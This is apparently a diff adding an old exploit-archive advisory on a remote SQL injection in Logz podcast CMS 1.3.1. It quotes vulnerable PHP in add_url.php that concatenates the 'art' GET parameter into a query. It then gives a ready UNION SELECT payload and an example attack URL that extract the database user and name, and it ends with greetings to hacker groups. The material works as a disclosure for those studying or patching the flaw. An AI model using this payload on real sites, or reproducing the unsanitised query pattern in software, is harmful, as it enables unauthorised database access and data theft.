@@ -1,0 +1,55 @@
+[~] Logz podcast CMS version 1.3.1 Remote sql inj
+[~]
+[~] download: http://sourceforge.net/project/showfiles.php?group_id=107225&package_id=178479&release_id=635701
+[~]
+[~] ----------------------------------------------------------
+[~] Discovered By: ZoRLu
+[~]
+[~] Date: 31.10.2008
+[~]
+[~] Home: www.z0rlu.blogspot.com
+[~]
+[~] contact: trt-turk@hotmail.com
+[~]
+[~] N0T: YALNIZLIK, YiTiRDi ANLAMINI YALNIZLIGIMDA : ( (
+[~] 
+[~] N0T: a.q kpss : ) )
+[~]
+[~] -----------------------------------------------------------
+
+file:
+
+fichiers/add_url.php
+
+code:
+
+       if (isset($_GET['art'])) {
+	      $Article = $_GET['art']; 
+	      
+	      ...
+	      
+	      $Requete = "SELECT TITRE FROM ".TABLEARTICLES." WHERE ID = '".$Article."' ".$Conditions;
+        $ResultRequete = requete_mysql($Requete);
+	      
+	   
+
+Exploit:
+
+http://localhost/script_path/fichiers/add_url.php?art=[SQL]
+
+[SQL]= column number 1 (SELECT TITRE FROM ...)
+
+1'+union+select+concat(user(),0x3a,database())/*
+
+example:
+
+http://example.com/scripth_path/fichiers/add_url.php?art=1'+union+select+concat(user(),0x3a,database())/*
+
+[~]----------------------------------------------------------------------
+[~] Greetz tO: str0ke & all Muslim HaCkeRs
+[~]
+[~] yildirimordulari.org  &  darkc0de.com
+[~]
+[~]----------------------------------------------------------------------
+
+# milw0rm.com [2008-10-31]
